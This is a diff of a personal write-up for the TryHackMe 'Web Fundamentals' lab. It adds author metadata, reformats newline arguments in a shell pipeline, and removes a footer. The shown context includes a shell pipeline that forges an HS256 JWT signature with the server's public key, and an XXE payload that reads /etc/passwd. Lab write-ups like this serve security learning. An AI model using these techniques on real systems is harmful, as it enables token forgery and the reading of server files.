@@ -1,5 +1,8 @@
 # TryHackMe: Web Fundamentals
 
+author:: Nathan Acks  
+date:: 2022-01-16
+
 ## LFI
 
 ### Deploy
@@ -90,9 +93,11 @@ Putting this all together, we can encode an `HS256` signature (assuming that the
 
 ```bash
 echo -n "$HEADER.$PAYLOAD" | \
-openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat $PUBLIC_KEY_FILE | xxd -p | tr -d '\n') | \
+openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat $PUBLIC_KEY_FILE | xxd -p | tr -d '
+') | \
 sed -e 's/.*= //' | \
-tr -d '\n' | \
+tr -d '
+' | \
 xxd -p -r | \
 basenc --base64url | \
 sed -e 's/=*$//'
@@ -122,8 +127,3 @@ Confirming that a garbage DOCTYPE/ELEMENT definition are fine, the following app
 	<!ENTITY test SYSTEM "file:///etc/passwd">
 ]>
 ```
-
-- - - -
-
-<span aria-hidden="true">👤</span> Nathan Acks  
-<span aria-hidden="true">📅</span> January 16, 2022
